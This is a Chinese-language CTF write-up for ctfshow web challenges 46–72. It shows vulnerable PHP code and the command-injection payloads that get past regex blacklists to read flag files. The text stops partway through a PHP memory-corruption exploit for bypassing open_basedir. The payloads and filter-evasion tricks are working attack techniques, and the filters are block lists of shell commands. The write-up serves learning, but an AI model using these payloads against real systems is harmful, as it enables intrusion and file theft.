<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

过滤了数字，$，*

那么就需要做相应修改

空格使用%09，url解析为Tab，%0a，url解析为回车，*被禁用，改成?就好了

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web47

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

1. **`more`：**
   - `more` 命令用于逐页显示文本文件的内容。当文本文件内容超过一个屏幕时，`more` 会逐页显示，并且等待用户按键（通常是空格键）以继续显示下一页。
2. **`less`：**
   - `less` 也是用于逐页显示文本文件的内容，但相较于 `more` 具有更多功能和交互性。用户可以通过键盘进行向前翻页、向后翻页、搜索等操作。
3. **`head`：**
   - `head` 命令用于显示文件的开头部分，默认显示文件的前 10 行。可以使用参数指定显示的行数。
4. **`sort`：**
   - `sort` 命令用于对文本文件进行排序，默认以字母顺序排序。可以通过不同的选项来实现不同的排序方式，如数字排序等。
5. **`tail`：**
   - `tail` 命令用于显示文件的结尾部分，默认显示文件的最后 10 行。可以使用参数指定显示的行数。它通常用于监视正在进行的日志文件。

增添了部分命令的过滤，如上

Payload直接沿用上一个

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web48

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

1. **`sed`：**
   - `sed`（Stream Editor）是一个流编辑器，用于对文本进行流式处理。它可以进行文本替换、删除、插入等操作，通常与正则表达式一起使用。
2. **`cut`：**
   - `cut` 命令用于从文本行或字段中剪切出指定的部分。它通常用于处理以特定分隔符分割的文本文件，如CSV文件。
3. **`awk`：**
   - `awk` 是一种强大的文本处理工具，用于在文本文件中逐行进行处理。它支持自定义的文本处理脚本，可以执行复杂的文本分析和转换操作。
4. **`strings`：**
   - `strings` 命令用于从二进制文件中提取可打印的字符串。它通常用于查找二进制文件中的文本信息，如可执行文件或库文件。
5. **`od`：**
   - `od`（octal dump）命令以八进制、十六进制或其他格式显示文件的内容。它通常用于查看二进制文件的内容。
6. **`curl`：**
   - `curl` 是一个命令行工具，用于通过 URL 进行数据传输。它支持多种协议，包括 HTTP、HTTPS、FTP 等，可以用于下载文件、发送请求等网络操作。

过滤以上

不妨碍上一个payload，但是我们也可以去相应探究所禁止的这些命令的利用方法

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web49

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增过滤了`，%

注意在输入%09和%0a的时候，实际解析为下文，自行查找

[HTML URL 编码参考手册 (w3school.com.cn)](https://www.w3school.com.cn/tags/html_ref_urlencode.asp)

因此该payload依旧能打通

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla?.php%0a</span><br></pre></td></tr></table></figure>

## web50

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增过滤\x09|\x26

这边使用nl命令

`nl` 是一个用于在文本文件中显示行号的命令。该命令通常在命令行终端中使用，用于对文本文件进行行号标记，方便用户查看和定位特定行。

以下是 `nl` 命令的基本用法：

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> [选项] 文件名</span><br></pre></td></tr></table></figure>

主要选项包括：

- `-b`：指定行号的计数方式，可以是 `t`（表示非空行）、`a`（表示所有行）、`n`（表示不标行号）。
- `-i`：设置行号的递增间隔。
- `-v`：指定行号的起始值。

例如，要对文件 `example.txt` 进行行号标记，可以使用以下命令：

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> example.txt</span><br></pre></td></tr></table></figure>

这将输出带有行号的文件内容。`nl` 命令对于查看大型文本文件或在脚本中进行文本处理时很有用。

给出payload

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

## web51

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

增加了对tac命令的过滤

可以绕过，也可以换其他命令

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac&lt;fl&#x27;&#x27;ag.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

## web52

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

将<和>也进行了过滤，但是放开了对$的过滤

修改一个空格绕过方式就可以了

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fla&#x27;&#x27;g%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=t&#x27;&#x27;ac$&#123;IFS&#125;/fl&#x27;&#x27;ag%0a</span><br></pre></td></tr></table></figure>

## web53

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

新增wegt的过滤

简单展示两种

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla&#x27;&#x27;g.php%0a</span><br></pre></td></tr></table></figure>

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ca\t$&#123;IFS&#125;fla\g.php%0a</span><br></pre></td></tr></table></figure>

## web54

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

因为本题通过通配符将大部分利用命令包括其相应的绕过方式都进行了过滤

本题大致思路有两种

一种是将flag的页面复制到其他页面，再进行读取

一种是直接利用未过滤的查找命令

（多学linux

#### 方法一

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cp$&#123;IFS&#125;???g.php$&#123;IFS&#125;t.txt</span><br></pre></td></tr></table></figure>

然后访问t.txt

#### 方法二

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>

#### 方法三

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;%27fla%27$&#123;IFS&#125;f???????%0a</span><br></pre></td></tr></table></figure>

#### 方法四

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c= mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???.php</span><br></pre></td></tr></table></figure>

## web55

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

见下题

## web56

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

这两道题，后一道题只是比前一道题多出了一个过滤数字

解法是类似的 

#### 方法一

第一种方法仅针对第一题而言

正常命令应该是

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

需要绕过字母，因此可以使用?进行匹配

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????????</span><br></pre></td></tr></table></figure>

#### 方法二

本题的关键是先构造一个上传的数据包，然后利用.执行保存再临时文件目录下的的sh文件命令

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>

这边比较有趣的一个思路就是使用[]范围限制控制大小写的匹配，具体参照P神的这篇文章

[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

## web57

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

本题是一个数字过滤的问题，首先了解一个

 \$(())=0，对其进行取反得到\$(( ~$(()) ))=1，然后再此基础上取值为36

对于36，首先对其进行取反，得到为-37，然后利用-1进行加和，最终得到36

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

## web58

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

#### 方法一

include+伪协议绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

直接使用highlight_file显示页面

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>

## web59

## web60

## web61

## web62

## web63

## web64

## web65

这两题跟58用同一个都能打通，因为是黑盒，也不确定到底是禁了什么函数

## web66

黑盒，无源码

### payload

1. 首先查看目录

   都是使用了scandir函数对根目录进行罗列，区别在于使用的回显函数

   **方法一**

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>

   **方法二**

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

2. 查看文件内容

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;../../../../../flag.txt&quot;);</span><br></pre></td></tr></table></figure>

   可以参考上面，这边只给出一个实例

## web67

### payload

print_r函数被禁用，使用另一个就行

## web68

### payload

禁用了highlight_file等，然后这边使用另外一个readgzfile，查看内容与上一题一样

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;)); </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>

## web69

### payload

只是每题禁用了不同的函数，寻找合适的替换就行

1. 首先查看目录

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

2. 查看文件内容

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>


## web70

同69仍然可以生效

## web71

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>

### payload

查看源码，在命令执行后回显页面前先将内容进行替换

#### 方法一

缓冲区劫持，可利用函数

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_flush();</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_flush();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_end_flush();</span><br></pre></td></tr></table></figure>

#### 方法二

命令执行之后就对程序进行退出操作

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);die();</span><br></pre></td></tr></table></figure>

## web72

### payload

本题查找的payload还能看懂，但是后面读取不是很理解

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

下面是对open_basedir()的绕过操作，没太看明白，需要再研究

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        